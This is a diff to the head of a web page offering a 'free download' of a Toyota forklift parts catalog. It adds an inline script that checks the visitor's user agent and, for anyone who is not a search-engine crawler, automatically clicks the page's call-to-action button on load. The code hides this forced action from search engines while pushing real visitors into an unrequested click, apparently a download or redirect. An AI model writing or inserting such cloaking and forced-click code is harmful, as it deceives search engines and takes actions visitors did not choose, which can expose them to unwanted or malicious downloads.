@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Toyota Forklift Quality Parts Arena v2.0.0</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Toyota Forklift Quality Parts Arena v2.0.0: a detailed electronic parts catalog with service instructions, guidelines, and more for Toyota Forklifts. Free download available.">
     <meta name="keywords" content="Toyota Forklift Parts, Forklift Parts Catalog, Toyota Forklift Accessories, Forklift Electronic Components, Toyota Forklift Service Instructions, Forklift Assembly Guidelines, Toyota Parts Arena, Forklift Operational Guidelines, Toyota Forklift Spare Parts, Forklift Maintenance Information, Toyota Equipment Parts, Forklift Repair Manual, Toyota Forklift V2.0.0, Forklift System Components, Toyota Forklift Information, Toyota Forklift Guality Parts Arena, Toyota Forklift Guality Parts Arena v2.0.0, Toyota Forklift v2.0.0 free download, Toyota Forklift Guality Parts Arena catalog, Toyota Forklift spare parts catalog, Toyota Forklift parts download, Toyota Forklift parts catalog download, Toyota Forklift parts catalog free download, Toyota Forklift catalog download, каталог бесплатно, скачать каталог запчастей, Toyota погрузчик детали, Toyota forklift parts Arena, сервисные инструкции Toyota погрузчик, компоненты электронные погрузчик Toyota, каталог запчастей погрузчик Toyota, Toyota Forklift запчастей каталог">
     <style>
